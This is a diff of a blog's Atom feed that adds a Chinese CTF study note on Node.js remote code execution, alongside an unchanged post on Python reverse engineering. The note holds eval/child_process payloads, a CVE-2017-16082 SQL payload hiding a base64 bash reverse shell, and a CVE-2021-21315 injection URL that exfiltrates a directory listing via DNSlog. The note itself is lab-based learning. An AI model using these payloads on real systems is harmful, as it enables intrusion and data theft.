@@ -6,7 +6,7 @@
   <link href="https://24kblog.top/atom.xml" rel="self"/>
   
   <link href="https://24kblog.top/"/>
-  <updated>2025-03-23T06:59:55.890Z</updated>
+  <updated>2025-03-31T17:10:36.985Z</updated>
   <id>https://24kblog.top/</id>
   
   <author>
@@ -17,11 +17,40 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Node.js RCE 漏洞总结</title>
+    <link href="https://24kblog.top/posts/2767279470/"/>
+    <id>https://24kblog.top/posts/2767279470/</id>
+    <published>2025-03-31T17:06:06.000Z</published>
+    <updated>2025-03-31T17:10:36.985Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="命令执行">命令执行</h2><p>使用 <a href="https://nodejs.cn/api/child_process.html#child_processspawnsynccommand-args-options">child_process 子进程</a> 执行系统指令</p><p>如果有使用 eval 函数则可以使用以下方式执行系统指令</p><pre><code>?eval=require('child_process').execSync('cmd').toString()</code></pre><p>以上指令详细解释：</p><ul><li><code>require('child_process')</code> 用于导入 Node.js 的 child_process 模块。<ul><li>注：Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令</li></ul></li><li><code>execSync('cmd')</code> 同步执行其中的指令</li><li><code>toString()</code> 将返回的对象转换为字符串类型</li></ul><p>若过滤了exec，还有 <code>spawnSync</code> 用法和详细解释如下</p><pre><code>eval=require(&quot;child_process&quot;).spawnSync('cmd',['args']).stdout.toString()</code></pre><ul><li><code>require('child_process')</code> 同上</li><li><code>spawnSync('cmd',['args'])</code> 同步执行 cmd 命令，数组内容是参数</li><li><code>stdout</code> 访问子进程的标准输出，它是一个缓冲区（Buffer）对象。</li><li><code>toString()</code> 方法将缓冲区转换为字符串，使输出内容可读。</li></ul><h3 id="例题">例题</h3><ul><li>CTFshow - web335</li><li>CTFshow - web336</li></ul><h2 id="Node-js-CVE-的复现">Node.js CVE 的复现</h2><h3 id="CVE-2017-16082">CVE-2017-16082</h3><h4 id="原理">原理</h4><p>详细请见<a href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html"> node.js + postgres 从注入到Getshell</a></p><p>简述：获取数据库字段名并处理时将字段名作为参数传入 Function 类中，搭配 SQL 注入即可通过其创建的函数来远程执行代码</p><h4 id="复现">复现</h4><p>靶机地址：<br /><a href="https://github.com/vulhub/vulhub/blob/master/node/CVE-2017-16082/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/node/CVE-2017-16082/README.zh-cn.md</a></p><p>Payload：</p><pre><code class="language-sql">SELECT 1 AS &quot;\']=0;require=process.mainModule.constructor._load;/*&quot;, 2 AS &quot;*/p=require(`child_process`);/*&quot;, 3 AS &quot;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*&quot;, 4 AS &quot;*/`cC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash`)//&quot;</code></pre><p>靶机中无法直接控制字段名，但是因为可以多句执行，所以也可以控制传入的字段名</p><p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=MEpGdExCZWlSemtNOXlQYzRCQUNFUFZjZCtGOHBheFE=" alt="Pasted image 20250331231432" data-caption="Pasted image 20250331231432" loading="lazy"></p><p>虽然此处返回内部错误，但此处其实已经成功反弹了 shell</p><p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=M1JhdkJCT05HUFM0UllPNEJNSG0zL1ZjZCtGOHBheFE=" alt="Pasted image 20250331231548" data-caption="Pasted image 20250331231548" loading="lazy"></p><p>注意事项：在传参的过程中要进行 URL 编码后再发送请求，否则无法复现成功</p><h3 id="CVE-2021-21315">CVE-2021-21315</h3><p>靶机地址：使用 <a href="https://github.com/fofapro/vulfocus">vulfocus</a> 自建</p><p>Payload</p><pre><code>http://ip:port/api/getServices?name[]=$(&quot;cmd&quot;)</code></pre><p>仅需发送 GET 请求即可</p><p>在靶机中使用的 Payload 如下：</p><pre><code>http://127.0.0.1:56430/api/getServices?name[]=$(ping%20`ls%20/tmp`.d247976159.ipv6.bypass.eu.org)</code></pre><p>使用 Dnslog 服务，最终得到 flag</p><p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=cy9IVUJkbmplQ0ZBVTR5dFJsR2plUFZjZCtGOHBheFE=" alt="1743440284690" data-caption="1743440284690" loading="lazy"></p><p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=WVk5WEZ2L1p5ZzVSb25Gd2hCM3lwZlZjZCtGOHBheFE=" alt="Pasted image 20250401010532" data-caption="Pasted image 20250401010532" loading="lazy"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;命令执行&quot;&gt;命令执行&lt;/h2&gt;
+&lt;p&gt;使用 &lt;a href=&quot;https://nodejs.cn/api/child_process.html#child_processspawnsynccommand-args-options&quot;&gt;child_process 子进</summary>
+      
+    
+    
+    
+    
+    <category term="CTF" scheme="https://24kblog.top/tags/CTF/"/>
+    
+    <category term="笔记" scheme="https://24kblog.top/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="Node.js" scheme="https://24kblog.top/tags/Node-js/"/>
+    
+    <category term="RCE" scheme="https://24kblog.top/tags/RCE/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Python逆向</title>
     <link href="https://24kblog.top/posts/426072920/"/>
     <id>https://24kblog.top/posts/426072920/</id>
     <published>2025-03-23T06:57:37.000Z</published>
-    <updated>2025-03-23T06:59:55.890Z</updated>
+    <updated>2025-03-23T07:00:09.859Z</updated>
     
     <content type="html"><![CDATA[<h2 id="常用工具">常用工具</h2><blockquote><p>工欲善其事，必先利其器</p></blockquote><ul><li><code>pyinstxtractor-ng</code>：用于解压打包好的 exe 文件</li><li><code>pycdc/pycdas</code>：用于反编译 pyc 文件</li><li><code>IDA</code>：逆向 pyd/so 文件</li></ul><h2 id="如何判断">如何判断</h2><p>可以通过图标来判断，也可以先拖入 IDA 查看，可以看到有很多 Py 开头的引用</p><h2 id="几种题型">几种题型</h2><h3 id="直接反编译型">直接反编译型</h3><p>一般来说，这种题型不会在放反编译上下太大功夫，而主要考察其它方面，如密码学<br />通常是打包成exe文件或者直接给pyc文件</p><h4 id="解法">解法</h4><p><code>pycdc</code> 直接唆</p><pre><code>pycdc -o output.py ./input.pyc</code></pre><p>如果遇到已经打包好的：</p><pre><code>pyinstxtractor-ng target.exe</code></pre><p>然后找到对应的pyc文件使用pycdc反编译即可</p><h4 id="例题">例题</h4><ul><li>2024 红岩杯 - MniGame</li><li>2020 moeCTF - MidPython</li></ul><h3 id="字节码类">字节码类</h3><p>python 编译后也是有类似汇编的东西的，通过 PVM 来执行这些代码<br />简单来说就是虚拟机，跟寒假考核的虚拟机是相似的原理，像这样的虚拟机还有 JVM，处理 Java Class 文件的</p><h4 id="解法-2">解法</h4><p>这类型的题目分为两种，一种是直接给字节码的文本文件，需要自己翻译成普通的 Python 代码 ，<br />还有一种就是 <code>pycdc</code> 无法正常反编译时，需要使用 <code>pycdas</code> 来读取汇编理解程序</p><p>这样的题目主要在于如何理解程序，好在 Python 汇编比较好理解，也有对应的文档可查</p><p>使用 <code>uTools</code> 软件安装 Python 文档插件，然后输入 <code>opcode 对应汇编语句</code> 即可查询对应用法</p><h4 id="例题-2">例题</h4><ul><li>2021 ZJCTF - crackPYC</li><li>第二届黄河流域网络安全技能挑战赛 - ezpyc</li></ul><h3 id="pyd-so-逆向-Cython">pyd/so 逆向 (Cython)</h3><p>最难的部分</p><p>首先讲一下 Cython 的原理，Cython 是一个 Python 扩展或者说是另一种编程语言，这取决于你怎么去使用它，使用 Cython 可以加快程序的运行速度</p><p>Cython 的一个用法是先将一个 Python 文件翻译为 C 语言文件，然后再编译为 pyd(WIindows)/so(Linux) ，最后在需要的 Python 文件中引入这些动态链接库</p><p>另外一个用法是直接使用由 C 编译好的库</p><p>还有一个就是将其当作一个结合了 C 和 Python 的编程语言，源码文件后缀为 <code>pyx</code></p><p>在逆向实践中，主要是对 <code>pyd/so</code> 文件进行逆向，但是为了兼容 Python 的动态类型、面向对象等特性，Cython 生成的 C 源码加入了大量的兼容性内容，可读性很差，更不用说逆向之后了</p><p>Cython 视频：BV1JQiCY9ELX BV1J2BJYoEGo</p><h4 id="解法-3">解法</h4><p>参考：<a href="https://blog.csdn.net/qq_36791177/article/details/144567790">系统讲解pyd逆向/Cython逆向</a></p><ul><li><p>分析 <code>pyd</code> 文件进行信息搜集，确认 Python 版本，函数名等</p><ul><li>可以通过编写另外一个python程序并引用此pyd文件，然后dir查看</li><li>也可以导入 IDA 然后查找字符串</li></ul></li><li><p>linux编译一份相同python版本的so文件，ida载入，File-&gt;Produce File-&gt;Create C Header File导出结构体</p></li><li><p>加载需要逆向的pyd，File-&gt;Load File-&gt;Parse C Header File，导入so文件导出xxx.h(有错误就修复)，导入so文件导出的xxx.h是因为错误比较少，windows带调试符号导出的header错误较多比较难修复</p></li><li><p>windows编译一份带调试信息的pyd，ida导出idb，bindiff载入</p></li><li><p>定位__Pyx_CreateStringTabAndInitStrings()，还原__pyx_mstate结构体(python变量名)</p></li><li><p>定位_Pyx_InitConstants()，还原__pyx_mstate结构中的整数成员</p></li><li><p>定位到核心函数，动态调试</p></li><li><p>根据调用Cython api的库函数，重新定义变量类型为导入的结构体，来高效还原python代码</p></li><li><p>动态调试，frida hook等<br />可能还有其它方法，有待研究</p></li></ul><h4 id="例题-3">例题</h4><ul><li>2024-CCB-CISCN-Quals - cython</li><li>2024-CCB-CISCN-Quals - rand0m</li></ul><h3 id="其它">其它</h3><p>除了上述的几种，还有 Pyinstaller 打包时加密，或者是对 <code>pyc</code> 加花，改或删 magic_number 等等<br />不知道之后出题人还会有什么玩法</p><h4 id="解法-4">解法</h4><ul><li>magic_number：<a href="https://www.cnblogs.com/czlnb/p/15118864.html">https://www.cnblogs.com/czlnb/p/15118864.html</a></li><li>Pyinstaller 打包时加密：<a href="https://bbs.kanxue.com/thread-271253.htm">详细解法</a>/简述：先解包，然后找crypto_key(含key参数)和archive(含加密过程)</li><li><code>pyc</code> 加花：可能需要16进制编辑去花</li><li>有些解法还要搭配动态调试等食用</li></ul>]]></content>
     
